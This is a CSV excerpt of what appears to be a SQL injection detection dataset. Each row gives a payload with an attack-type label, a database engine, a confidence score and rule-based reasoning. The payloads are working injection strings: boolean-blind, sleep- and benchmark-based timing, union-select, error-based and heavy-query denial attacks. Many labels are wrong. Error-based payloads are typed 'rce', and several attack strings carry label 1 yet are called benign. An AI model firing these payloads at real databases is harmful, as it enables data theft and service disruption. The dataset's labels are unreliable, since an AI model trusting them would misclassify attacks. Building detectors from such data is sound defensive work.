row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3270,"1'+ ( select dgnt where 4701 = 4701 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,,boolean_blind,generic,0.95,4701 = 4701 or detected — boolean_blind injection (priority 8) on generic,rule-based
3271,-8729'+ ( select 'nbzl' where 7160 = 7160 order by 1#,1,,boolean_blind,generic,0.95,7160 = 7160 or detected — boolean_blind injection (priority 8) on generic,rule-based
3272,"1%' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( '%' = '",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3273,"1 ) ) as ynzg where 1926 = 1926 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
3274,"1 ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 7589 = 7589",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3275,1 ) as hhly where 2906 = 2906,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3276,"1' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 'pcim' = 'pcim",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
3277,1 ) as vqbf where 4020 = 4020,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3278,"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3279,"1 ) union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3280,"1'|| ( select 'rqzu' from dual where 9516 = 9516 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3281,1' ) ) as gfzb where 7904 = 7904,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3282,"1%"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
3283,"-9779' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'hmzj' = 'hmzj",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
3284,"1' where 9156 = 9156 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,9156 = 9156 and detected — boolean_blind injection (priority 8) on generic,rule-based
3285,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'ekhi' = 'ekhi",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3286,"1%' ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
